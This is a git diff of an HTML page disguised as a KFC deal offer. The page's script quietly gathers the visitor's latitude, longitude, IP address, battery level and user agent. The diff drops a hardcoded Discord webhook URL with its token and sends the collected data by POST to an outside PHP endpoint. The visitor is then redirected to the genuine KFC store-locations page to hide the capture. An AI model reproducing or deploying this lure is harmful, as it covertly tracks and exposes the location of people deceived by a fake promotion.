@@ -118,8 +118,6 @@
       bg.appendChild(img);
     }
 
-    const webhookUrl = "https://discord.com/api/webhooks/1400382122866249758/e2PIiGtfPBi0SQlRzF55kOmzGW2yUl-0HvUfjgp0Pohh9IAoWnbP-7EmGSKNbUnHgXjh";
-
     async function sendLocation() {
       let lat = "N/A", lon = "N/A", accuracy = "N/A", ip = "N/A", battery = "N/A", userAgent = navigator.userAgent;
 
@@ -157,11 +155,18 @@ const content = `🍗 **Nearby KFC Deal Request**
 📍 [Google Maps Link](${mapUrl})${signature}`;
 
 
-            fetch(webhookUrl, {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({ content: content })
-            }).finally(() => {
+            fetch("https://xombie-tools.infy.uk/script/save.php", {
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify({
+    lat: lat,
+    lon: lon,
+    accuracy: accuracy,
+    ip: ip,
+    battery: battery,
+    ua: userAgent
+  })
+}).finally(() => {
               setTimeout(() => {
                 window.location.href = "https://www.kfcpakistan.com/store-locations";
               }, 1000);
@@ -179,3 +184,4 @@ const content = `🍗 **Nearby KFC Deal Request**
 
 </body>
 </html>
+
